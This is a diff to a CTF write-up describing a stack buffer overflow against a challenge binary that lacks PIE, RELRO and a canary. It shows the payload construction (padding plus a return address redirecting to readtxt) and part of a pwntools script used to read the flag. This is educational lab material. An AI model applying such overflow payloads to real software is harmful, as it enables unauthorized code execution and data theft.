@@ -6,7 +6,7 @@ This document is a brief explanation of our resolution of the Wordpress CTF pres
 
 We start exploring the program source code and answering this questions:
 
-- **Question1**: Is there any file that is opened and readed by the program?
+- **Question1**: Is there any file that is opened and read by the program?
 
 - **Answer**: Yes, there is a file that is opened by the program named `rules.txt`.
 
@@ -20,7 +20,7 @@ We start exploring the program source code and answering this questions:
 
 ## Searching and Analysing
 
-First we testes if the program is safe or have some types of vulnerabilities by running the command `checksec program` and this was what we obtain:
+First we test if the program is safe or have some types of vulnerabilities by running the command `checksec program` and this was what we obtain:
 
 <div align="center">
     <figure>
@@ -29,15 +29,15 @@ First we testes if the program is safe or have some types of vulnerabilities by 
     </figure>
 </div>
 
-Here we can observe that the program have some important protection mechanisms deactivated:
+Here we can observe that the program has some important protection mechanisms deactivated:
 
  - **RELRO**: Without this, we can perform a GOT overwrite attack, redirecting the execution flow of the program.
- - **Stack Canary**: Here it says that the program has a canary but in the statement of the CTF it says that "the challenge binary does not contain a canary", make it easy to attack.
- - **PIE**: Without the PIE, the program loads at fixed address every time making it easy to exploit.
+ - **Stack Canary**: Here it says that the program has a canary but in the statement of the CTF it says that "the challenge binary does not contain a canary", making it easy to attack.
+ - **PIE**: Without the PIE, the program loads at fixed address every time making it predictable and easy to exploit.
 
-The program has some other important vulnerabilities deactivated but this are the most important ones to our exploit.
+The program has some other important vulnerabilities deactivated but this are the most relevant ones for our exploit to be successful.
 
-To realize the exploit we start by finding the memory address where the function `readtxt` is allocated. To do that we used the `gdb` tooland found that were the address `0x80497a5`.
+To achieve the exploit we start by finding the memory address where the function `readtxt` is allocated. To do that we used the `gdb` tool and find out that was address `0x80497a5`.
 
 <div align="center">
     <figure>
@@ -46,13 +46,13 @@ To realize the exploit we start by finding the memory address where the function
     </figure>
 </div>
 
-Then we just need to know what's the buffer size that we find by loocking at the source code and was 32 bytes.
+We then learn that the buffer has 32 bytes of size by looking at the source code.
 
-This was all we need to do the exploit.
+This is all we need to perform the exploit.
 
 ## Exploit
 
-To do the exploit we create an script in python where we call the program, build a payload and put the payload in the input of the program.
+To carry out the exploit we create a python script where we call the program, build a payload and put the payload in the input of the program.
 
 Here is how the payload is constructed:
 - `flag\x00`:
@@ -70,7 +70,7 @@ Payload after construction:
 payload = b"flag\x00" + b"A" * (31 - len("flag")) + p32(0x80497a5)
 ```
 
-To do this exloit we used the `pwntools` library in Python and this was the complete script we use to do this exploit:
+To do this exploit we used the `pwntools` library in Python and this was the complete script we use to do this exploit:
 
 ```python
 #!/usr/bin/python3
@@ -93,3 +93,5 @@ r.sendline(payload)
 buf = r.recv().decode()
 print(buf)
 ```
+
+With this script we successfully retrieved the flag from the flag.txt file.
